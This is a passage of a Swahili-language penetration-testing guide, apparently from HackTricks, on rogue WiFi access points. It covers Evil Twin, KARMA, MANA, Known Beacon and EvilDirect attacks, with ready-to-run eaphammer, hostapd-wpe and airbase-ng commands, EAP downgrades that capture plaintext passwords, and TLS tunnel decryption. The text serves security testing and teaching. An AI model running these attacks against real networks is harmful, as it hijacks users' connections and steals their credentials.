- Directed probe requests huelekezwa kwa ESSID maalum, kusaidia kugundua kama mtandao fulani uko ndani ya eneo la kufikia, hata ikiwa ni hidden network.
- Broadcast probe requests zina field ya SSID ya null na zinatumwa kwa APs zote za karibu, zikimruhusu station kukagua kama kuna mtandao uliopendekezwa bila kufichua yaliyomo kwenye PNL yake.

## AP Rahisi na uelekezaji kwa Intaneti

Kabla ya kuelezea jinsi ya kufanya mashambulizi magumu zaidi, itafafanuliwa **jinsi** ya tu **kuunda** **AP** na **kuelekeza** trafiki yake kwa interface iliyounganishwa **na** **Intaneti**.

Tumia `ifconfig -a` hakiki kwamba wlan interface ya kuunda AP na interface iliyounganishwa na Intaneti zipo.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Unda faili ya usanidi `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Kisha **set IPs** na **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Kisha **anzisha** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Tengeneza faili ya konfigurasi `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zima michakato inayosumbua** , weka **monitor mode**, na **anza hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Upelekaji na Uelekezaji
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Shambulio la evil twin linatumia jinsi wateja wa WiFi wanavyotambua mitandao, kwa msingi likitegemea jina la mtandao (ESSID) bila kuhitaji base station (access point) kujithibitisha kwa mteja. Mambo muhimu ni pamoja na:

- **Ugumu wa Kutofautisha**: Vifaa vinapata shida kutofautisha kati ya access points halali na rogue access points wakati vinashare ESSID na aina ya encryption sawa. Mitandao halisi mara nyingi hutumia access points nyingi zenye ESSID moja ili kupanua kifunikizo bila mshono.
- **Roaming ya mteja na udhibiti wa muunganisho**: Protokoli ya 802.11 inaruhusu vifaa kutembea kati ya access points ndani ya ESS moja. Washambulizi wanaweza kutumia hili kwa kumvutia kifaa kukata muunganisho na base station yake ya sasa na kuunganisha kwenye rogue access point. Hili linaweza kufikiwa kwa kutoa ishara yenye nguvu zaidi au kuvuruga muunganisho kwa access point halali kwa njia kama deauthentication packets au jamming.
- **Changamoto katika utekelezaji**: Kufanikiwa kutekeleza shambulio la evil twin katika mazingira yenye access points nyingi zilizo wekwa vizuri kunaweza kuwa changamoto. Deauthenticating access point halali moja mara nyingi husababisha kifaa kuunganisha kwenye access point halali nyingine isipokuwa mshambuliaji anaweza deauthenticate access points zote zinazokaribu au kuweka rogue access point kwa mkakati.

Unaweza kuunda Open Evil Twin ya msingi sana (bila uwezo wa kupitisha trafiki kwenda Internet) kwa kufanya:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Unaweza pia kuunda Evil Twin kwa kutumia **eaphammer** (zingatia kwamba ili kuunda evil twins kwa eaphammer, kiolesura **should NOT be** katika hali ya **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Au kutumia Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Tafadhali zingatia kwamba kwa chaguo-msingi, ikiwa ESSID kwenye PNL imehifadhiwa kama WPA protected, kifaa hatiunganishi moja kwa moja kwenye Open evil Twin. Unaweza kujaribu DoS AP halisi na kutegemea kwamba mtumiaji ataunganisha kwa mikono kwenye Open evil twin yako, au unaweza ku-DoS AP halisi na kutumia WPA Evil Twin kunasa handshake (kwa kutumia njia hii hautaweza kumruhusu mwathiriwa kuungana nawe kwa kuwa hujui PSK, lakini unaweza kunasa handshake na kujaribu ku-crack).

_Baadhi ya OS na AV zitaonya mtumiaji kwamba kuunganishwa na Open network ni hatari..._

### WPA/WPA2 Evil Twin

Unaweza kuunda **Evil Twin** kwa kutumia **WPA/2** na ikiwa vifaa vimewekwa kuunganishwa na SSID hiyo kwa **WPA/2**, vitajaribu kuungana. Hata hivyo, ili kumaliza **4-way-handshake** pia unahitaji **kujua** **password** ambayo client atatumia. Ikiwa **hujui**, **muunganisho hautamalizika**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Ili kuelewa mashambulizi haya, napendekeza kusoma kwanza muhtasari wa [WPA Enterprise explanation](#wpa-enterprise-mgt).

**Kutumia hostapd-wpe**

`hostapd-wpe` inahitaji faili la **configuration** ili ifanye kazi. Ili **automate** utengenezaji wa configurations hizi unaweza kutumia [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (pakua faili ya python ndani ya _/etc/hostapd-wpe/_)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
Katika faili ya usanidi unaweza kuchagua mambo mengi tofauti kama ssid, channel, user files, cret/key, dh parameters, wpa version na auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Kutumia EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Kwa chaguo-msingi, EAPHammer inakusudia mbinu hizi za uthibitishaji (zingatia GTC kama ya kwanza kujaribu kupata plaintext passwords na kisha kutumia mbinu za uthibitishaji zenye nguvu zaidi):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Hii ni mbinu ya chaguo-msingi ili kuepuka muda mrefu wa kuunganishwa. Hata hivyo, unaweza pia kuainisha kwa seva mbinu za uthibitishaji kutoka dhaifu hadi zenye nguvu:
```
--negotiate weakest
```
Au unaweza pia kutumia:

- `--negotiate gtc-downgrade` kutumia utekelezaji wa GTC downgrade wenye ufanisi mkubwa (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` kubainisha kwa mkono methods zinazotolewa (kutoa auth methods sawa kwa mpangilio ule ule kama shirika itafanya mashambulizi yafike vigumu kugunduliwa).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Using Airgeddon**

`Airgeddon` inaweza kutumia certificated zilizotengenezwa awali kutoa EAP authentication kwa networks za WPA/WPA2-Enterprise. Mtandao bandia utapunguza protocol ya muunganisho hadi EAP-MD5 ili uweze **kushika mtumiaji na MD5 ya password**. Baadaye, mshambuliaji anaweza kujaribu kuvunja password.\
`Airggedon` inakupa uwezekano wa **continuous Evil Twin attack (noisy)** au **only create the Evil Attack until someone connects (smooth).**

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

Ndani ya **configuration** ya _hostapd-wpe_ **comment** mstari unaoelezea _**dh_file**_ (kutoka `dh_file=/etc/hostapd-wpe/certs/dh` hadi `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Hii itafanya `hostapd-wpe` **kubadilishana keys kwa kutumia RSA** badala ya DH, hivyo utaweza **kufungua (decrypt)** trafiki baadaye **ukiwa unajua server's private key**.

Sasa anza **Evil Twin** ukitumia **`hostapd-wpe`** na configuration iliyobadilishwa kama kawaida. Pia, anzisha **`wireshark`** katika **interface** ambayo inaendesha mashambulizi ya Evil Twin.

Sasa au baadaye (ukiwa tayari umeshakamata baadhi ya authentication intents) unaweza kuongeza private RSA key kwenye wireshark katika: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Ongeza entry mpya na jaza fomu kwa hizi values: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, ili kuepuka matatizo chagua key file **isiyokuwa password protected**).

![](<../../images/image (687).png>)

Na tazama tab mpya ya **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Aina tofauti za Media Access Control Filter Lists (MFACLs) na modes zao na athari zao kwenye tabia ya rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Rogue AP itajibu tu probe requests kutoka kwa vifaa vilivyotajwa kwenye whitelist, ikibaki haioniwa kwa wengine wote wasioorodheshwa.
2. **MAC-based Blacklist**:
- Rogue AP itapuuzia probe requests kutoka kwa vifaa vilivyo kwenye blacklist, kwa ufanisi kuifanya rogue AP isionekane kwa vifaa hivyo maalum.
3. **SSID-based Whitelist**:
- Rogue AP itajibu probe requests tu kwa ESSIDs maalum zilizo kwenye orodha, ikifanya isionewe na vifaa ambavyo Preferred Network Lists (PNLs) hazijumuishi ESSIDs hizo.
4. **SSID-based Blacklist**:
- Rogue AP haitajibu probe requests kwa ESSIDs maalum zilizo kwenye blacklist, ikifanya isionewe kwa vifaa vinavyotafuta mitandao hiyo maalum.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Mbinu hii inaruhusu attacker kuunda malicious access point (AP) inayojibu probe requests zote kutoka kwa vifaa vinavyotafuta kuunganishwa kwenye networks. Mbinu hii **inawadanganya vifaa ili kuunganishwa na attacker's AP** kwa kuiga networks ambazo vifaa zinatafuta. Mara kifaa kitakapomtuma ombi la kuunganishwa kwa rogue AP hii, muunganisho unakamilika, na kusababisha kifaa kuunganishwa kwa makosa na network ya attacker.

### MANA

Baadaye, **vifaa vilianza kupuuza majibu ya network yasiyo imara**, kupunguza ufanisi wa original karma attack. Hata hivyo, mbinu mpya, inayojulikana kama **MANA attack**, ilianzishwa na Ian de Villiers na Dominic White. Mbinu hii inahusisha rogue AP **kuchukua Preferred Network Lists (PNL) kutoka kwa vifaa kwa kujibu broadcast probe requests zao** kwa majina ya network (SSIDs) yaliyohifadhiwa awali na vifaa. Shambulio hili tata linavuka kinga dhidi ya original karma attack kwa kutumia jinsi vifaa vinavyokumbuka na kuipa kipaumbele networks zinazojulikana.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** ni mkakati wa hali ya juu unaotumika wakati vifaa havifanyi directed probing au wakati Preferred Network Lists (PNL) zao hazijulikani kwa mshambulizi. Inafanya kazi kwa kanuni kwamba **vifaa vilivyo katika eneo moja kuna uwezekano wa kushirikiana baadhi ya majina ya mitandao katika PNLs zao**. Badala ya kujibu kwa uteuzi, shambulio hili hutangaza probe responses kwa kila jina la mtandao (ESSID) lililopatikana katika PNLs zilizojumlishwa za vifaa vyote vilivyotazamwa. Njia hii pana huongeza nafasi ya kifaa kutambua mtandao unaofahamika na kujaribu kuungana na rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Iwapo **Loud MANA attack** haitoshi, **Known Beacon attack** hutoa njia mbadala. Mbinu hii **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** inayotokana na wordlist. Hii inatengeneza uwepo wa mitandao mingi, ikitarajia kulinganisha ESSID ndani ya PNL ya mwathiriwa, na kusababisha jaribio la kuunganishwa na AP iliyotengenezwa. Shambulio linaweza kuimarishwa kwa kuichanganya na chaguo la `--loud` kwa jaribio kali zaidi la kuwadanganya vifaa.

Eaphammer imeitekeleza shambulio hili kama MANA attack ambapo ESSIDs zote ndani ya orodha zinatangazwa (pia unaweza kuichanganya na `--loud` ili kuunda Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Shambulio la **Known Beacon Burst attack** linahusisha utangazaji wa haraka wa beacon frames kwa kila ESSID iliyoorodheshwa katika faili. Hii inaunda mazingira ya msongamano ya mitandao bandia, ikiongeza kwa kiasi kikubwa uwezekano wa vifaa kuungana na rogue AP, hasa inapoambatana na MANA attack. Mbinu hii inatumia kasi na wingi kuzidisha mzigo kwenye taratibu za uchaguzi wa mtandao za vifaa.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ni itifaki inayowezesha vifaa kuunganisha moja kwa moja kwa kutumia Wi-Fi bila haja ya access point ya kawaida. Uwezo huu umejumuishwa katika vifaa mbalimbali vya Internet of Things (IoT), kama printers na televisions, ukirahisisha mawasiliano ya moja kwa moja kati ya vifaa. Kipengele muhimu cha Wi-Fi Direct ni kwamba kifaa kimoja huchukua jukumu la access point, kinachojulikana kama group owner, kusimamia muunganisho.

Usalama wa miunganisho ya Wi-Fi Direct unaanzishwa kupitia **Wi-Fi Protected Setup (WPS)**, ambayo inaunga mkono mbinu kadhaa za pairing salama, zikiwemo:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Mbinu hizi, hasa PIN entry, zinakabiliwa na udhaifu sawa na WPS katika mitandao ya Wi-Fi ya jadi, na kuziacha kuwa malengo ya attack vectors yanayofanana.

### EvilDirect Hijacking

**EvilDirect Hijacking** ni shambulio maalum kwa Wi-Fi Direct. Inafanana na wazo la Evil Twin attack lakini inalenga miunganisho ya Wi-Fi Direct. Katika tukio hili, mshambuliaji anafanya utani kuwa group owner halali kwa lengo la kudanganya vifaa viungane na entiti ya kibaya. Njia hii inaweza kufanywa kwa kutumia zana kama `airbase-ng` kwa kubainisha channel, ESSID, na MAC address ya kifaa kinachodanganywa:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Angalia [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (ingia na facebook na kuiga WPA katika captive portals)

{{#include ../../banners/hacktricks-training.md}}
